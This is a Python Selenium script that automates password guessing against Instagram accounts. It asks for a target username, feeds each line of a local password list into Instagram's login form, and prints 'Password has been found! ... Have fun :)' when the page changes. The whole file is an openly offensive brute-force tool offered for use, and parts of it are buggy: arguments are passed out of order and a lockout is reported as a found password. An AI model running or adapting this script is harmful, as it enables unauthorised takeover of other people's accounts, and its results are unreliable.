from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
import time as t
import sys
import requests


def function():
    website = "https://www.instagram.com"
    sys.stdout.write("[!]" + "Checking if site exists ")
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
         print("[OK]")
         sys.stdout.flush()
    except NoSuchElementException:
         pass
    except KeyboardInterrupt:
         print("Ctrl C used to exit. ")
         exit()
    except:
         t.sleep(1)
         print("[X]" + "Website not found. ")
         exit()
    
    username_selector = "#loginForm > div > div:nth-child(1) > div > label > input"
    password_selector = "#loginForm > div > div:nth-child(2) > div > label > input"
    login_button = "#loginForm > div > div:nth-child(3) > button > div"
    username = input("Enter the desired username: ")
    passlist = "C:\Files\passlist.txt"
    buttons(username, username_selector, password_selector, login_button, passlist, website)
         

def buttons(username, username_selector, password_selector, login_button, passlist, website):
    f = open(passlist, "r")
    driver = webdriver.EdgeOptions()
    browser = webdriver.Edge()
    driver.add_argument("--disable-popup-blocking")
    driver.add_argument("--disable-extensions")
    wait = WebDriverWait(browser, 10)
    
    # Loop through the file and try to login with every password in passlist
    while True:
            try: 
                for line in f:
                 browser.get(website)
                 t.sleep(4)

                 user_sel = browser.find_element(By.CSS_SELECTOR, username_selector)
                 pass_sel = browser.find_element(By.CSS_SELECTOR, password_selector)

                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, username_selector)))
                 user_sel.send_keys(username)
                 pass_sel.send_keys(line)

                 enter = browser.find_element(By.CSS_SELECTOR, login_button)
                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_button)))
                 t.sleep(5)
                 enter.click()

                 print ('------------------------')
                 print ('Tried password: ' + line + 'for user: ' + username)
                 print ('------------------------')
            except KeyboardInterrupt:
                print("Ctrl C was used. ")
                break
            except NoSuchElementException:
                print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
                print ('LAST PASS ATTEMPT BELLOW')
                print("Password has been found! {0}".format(line))
                print("Have fun :) ")
                exit()

username = input("Enter a username: ")
username_selector = "#loginForm > div > div:nth-child(1) > div > label > input"
password_selector = "#loginForm > div > div:nth-child(2) > div > label > input"
login_button = "#loginForm > div > div:nth-child(3) > button > div"
passlist = "C:\Files\passlist.txt"
website = "https://www.instagram.com"
function()
buttons(username, username_selector, password_selector, passlist, website, login_button)